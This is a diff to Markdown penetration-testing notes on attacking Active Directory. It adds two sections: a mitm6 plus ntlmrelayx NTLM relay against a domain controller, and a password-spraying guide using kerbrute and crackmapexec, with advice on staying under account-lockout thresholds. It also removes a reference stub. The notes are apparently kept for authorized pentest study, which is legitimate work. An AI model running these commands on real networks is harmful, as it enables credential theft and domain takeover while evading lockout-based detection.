@@ -96,6 +96,15 @@ Reference: [LLMNR/mDNS/NBT-NS Poisoning](https://github.com/Aghalarovf/Penetrati
 
 ---
 
+## 15. IPv6 + mitm6 → NTLM relay
+
+```powershell
+mitm6 -d domain.com &
+ntlmrelayx.py -6 -t smb://<DC_IP> -wh fakewpad -l loot
+```
+
+---
+
 ## 16. Enumeration with NXC
 
 Reference: [NetExec](https://github.com/Aghalarovf/Penetration-Tester/edit/main/Technical_Notes/Active_Directory/AD-Tools/Netexec.md)
@@ -119,6 +128,32 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
 ---
+
+## 20. Password Spraying
+
+```powershell
+cme smb <DC_IP> -u <user> -p <pass> --pass-pol
+
+# Lockout threshold 5 dirsə → maksimum 3 cəhd et
+# Sonra observation window qədər gözlə (adətən 30 dəq)
+
+# kerbrute-da delay:
+kerbrute passwordspray ... --delay 1000  # 1 saniyə
+
+# crackmapexec throttle:
+crackmapexec smb ... --jitter 5
+
+1. Tapılan bütün servis hesablarının şifrələrini digər bütün istifadəçilər üçün password spray
+2. Default Credentials
+3.
+
+# User enumeration əvvəlcə
+kerbrute userenum --dc <DC_IP> -d <domain> users.txt
+
+# Spray
+kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt 'Password123!'
+
+```
 
 ## 16. Enumerate Writable Objects
 ```powershell
@@ -189,13 +224,6 @@ impacket-getST -spn cifs/TARGET.sendai.vl \
   -impersonate Administrator \
   sendai.vl/FAKE$:Pass123!
 ```
-
-## 18. NTLM Relaying
-
-Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)
-
----
-
 
 ## 20. Credential Discovery 
 
